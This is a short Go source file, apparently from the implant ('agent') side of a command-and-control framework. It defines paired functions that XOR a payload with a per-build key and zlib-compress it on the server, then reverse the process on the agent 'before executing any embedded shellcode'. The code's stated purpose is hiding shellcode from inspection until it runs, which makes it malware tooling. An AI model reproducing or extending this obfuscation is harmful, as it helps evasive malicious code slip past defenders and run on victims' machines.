package agent

import (
	"bytes"
	"compress/zlib"
)

// transformDeobfuscate reverses per-build XOR obfuscation applied to embedded payloads.
// Called before executing any embedded shellcode when TransformObfuscate=="true".
// The encoding is: XOR with ObfuscationKey bytes (repeating), then zlib compress.
// Deobfuscation reverses this: zlib decompress, then XOR.
func transformDeobfuscate(data []byte) []byte {
	if TransformObfuscate != "true" || len(data) == 0 || ObfuscationKey == "" {
		return data
	}
	// Step 1: attempt zlib decompress
	r, err := zlib.NewReader(bytes.NewReader(data))
	if err == nil {
		defer r.Close()
		var buf bytes.Buffer
		buf.ReadFrom(r)
		data = buf.Bytes()
	}
	// Step 2: XOR with ObfuscationKey
	key := []byte(ObfuscationKey)
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return result
}

// transformObfuscate applies XOR with ObfuscationKey then zlib compresses.
// Use this on the server side to prepare embedded payloads, then call
// transformDeobfuscate on the agent side before execution.
func transformObfuscate(data []byte) []byte {
	if TransformObfuscate != "true" || len(data) == 0 || ObfuscationKey == "" {
		return data
	}
	key := []byte(ObfuscationKey)
	xored := make([]byte, len(data))
	for i, b := range data {
		xored[i] = b ^ key[i%len(key)]
	}
	var buf bytes.Buffer
	w := zlib.NewWriter(&buf)
	w.Write(xored) //nolint:errcheck
	w.Close()
	return buf.Bytes()
}
